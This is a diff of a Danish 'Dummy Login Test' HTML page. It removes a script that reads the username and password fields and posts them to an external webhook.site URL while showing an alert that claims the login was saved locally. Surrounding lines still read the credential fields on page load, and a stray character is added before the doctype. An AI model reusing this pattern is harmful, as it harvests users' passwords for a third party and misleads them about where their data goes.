@@ -1,31 +1,9 @@
-<!DOCTYPE html>
+o<!DOCTYPE html>
 <html lang="da">
 <head>
   <meta charset="UTF-8">
   <title>Dummy Login Test</title>
   <script>
-    window.onload = function() {
-
-      // ✅ LOVLIGT: Brug submit-event, så data først sendes efter input
-      document.getElementById("loginForm").onsubmit = function(e) {
-        e.preventDefault(); // Forhindrer siden i at reload
-
-        let username = document.getElementById("usernameInput").value;
-        let password = document.getElementById("passwordInput").value;
-
-        if(username && password) {
-          // Kun lovligt med dine egne testdata
-          fetch("https://webhook.site/990efb4e-3041-4151-b69a-edbd70b8f9c5", {
-            method: "POST",
-            headers: {"Content-Type": "application/json"},
-            body: JSON.stringify({username: username, password: password})
-          }).then(() => {
-            alert("Dummy-login gemt lokalt!");
-            document.getElementById("loginForm").reset();
-          }).catch(err => console.error(err));
-        }
-      };
-
        window.onload = function() {
            let username = document.getElementById("usernameInput").value;
            let password = document.getElementById("passwordInput").value;
@@ -50,3 +28,4 @@
   </form>
 </body>
 </html>
+
